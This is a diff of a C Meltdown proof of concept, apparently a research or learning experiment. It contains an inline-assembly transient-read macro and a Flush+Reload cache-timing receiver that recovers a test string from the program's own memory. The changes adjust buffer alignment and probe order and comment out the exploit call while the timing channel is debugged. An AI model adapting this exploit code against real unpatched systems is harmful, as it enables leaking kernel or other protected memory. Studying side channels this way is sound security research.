@@ -17,7 +17,6 @@
 #define RETRIES 1000
 
 // Downside of this implementation, can't read 0 values 
-#if DEBUG 
 #define MELTDOWN(addr) \
   asm("1:\n movzx (%%rcx), %%rax\n" \
       "shl $12, %%rax\n" \
@@ -26,16 +25,6 @@
       :						\
       : "c"(addr), "b"(rec)			\
       : "rax");
-#else
-#define MELTDOWN(addr) \
-  asm("1:\n movzx (%%rcx), %%rax\n" \
-      "shl $12, %%rax\n" \
-      "jz 1b\n" \
-      "movq (%%rax, %%rbx, 1), %%rbx\n" \ 
-      :						\
-      : "c"(addr), "b"(rec)			\
-      : "rax");
-#endif 
 
 /*
   Global vars 
@@ -47,8 +36,9 @@ char secret[100] = "hello world\n";
   Meltdown setup code 
  */
 void init() {
-  // setup recieving array 
+  // setup recieving array
   rec = (int *) malloc(sizeof(*rec) * 300 * 4096); // page stride
+  rec = (int *) (((size_t)rec & ~0xfff) + 0x2000);
   for(int i = 0; i < 256; i++) {
     _mm_clflush(&rec[i * 4096]); //flush it from memory 
   }
@@ -56,13 +46,21 @@ void init() {
   INFO("Init finished\n");
 }
 
-int read_byte_from_reciever() {
+
+/*
+  Read reciever bytes 
+ */
+int __attribute__((always_inline)) read_byte_from_reciever() {
   int junk = 0;
   int min_value = 1000; //which ever one has the lowest time to access
-  int min_idx = -1; 
+  int min_idx = -1;
+
+  // measure
   for(int i = 0; i < 256; i++) {
+    int mix_i = ((i * 167) + 13) & 255;
+
     // timing
-    int* addr = &rec[i * 4096];
+    int* addr = &rec[mix_i * 4096];
     int start = __rdtscp(&junk);
     junk = *addr;
     int elapsed = __rdtscp(&junk) - start;
@@ -70,44 +68,49 @@ int read_byte_from_reciever() {
     // check time 
     if(elapsed < min_value) {
       min_value = elapsed;
-      min_idx = i;
+      min_idx = mix_i;
     }
   }
 
-  // flush everything
-  for(int i = 0; i < 256; i++) {
+  // flush
+  for(int i = 0; i < 256; i++)
     _mm_clflush(&rec[i * 4096]);
-  }
   
   return min_idx;
 }
 
-char* read_string(char* addr) {
+char* __attribute__((optimize("-Os"), noinline)) read_string(char* addr) {
   char* ret = malloc(100); // 100 characters
   memset(ret, '\0', 100); // 0 out
   size_t size = strlen(addr);
 
   // get string 
   for(int i = 0; i < size; i++) {
-    // hit counter`
+    // hit counter
     int hit[256];
     for(int j = 0; j < 256; j++) hit[j] = 0; 
 
     // do RETRIES
     for(int j = 0; j < RETRIES; j++) {
       // meltdown attack into cache 
-      MELTDOWN(addr);
-      
+      //MELTDOWN(addr);
+
+      volatile int junk = rec[60 * 4096];
+            
       // recieve 
       int value = read_byte_from_reciever(addr);
 
-      hit[value]++; 
+      hit[value]++;
+      sched_yield();
     }
-
+    
     // find max
     int max = 0;
     int max_idx = -1;
     for(int j = 0; j < 256; j++) {
+#if DEBUG
+      INFO("%d %d\n", j, hit[j]);
+#endif 
       if(hit[j] > max) {
 	max = hit[j];
 	max_idx = j;
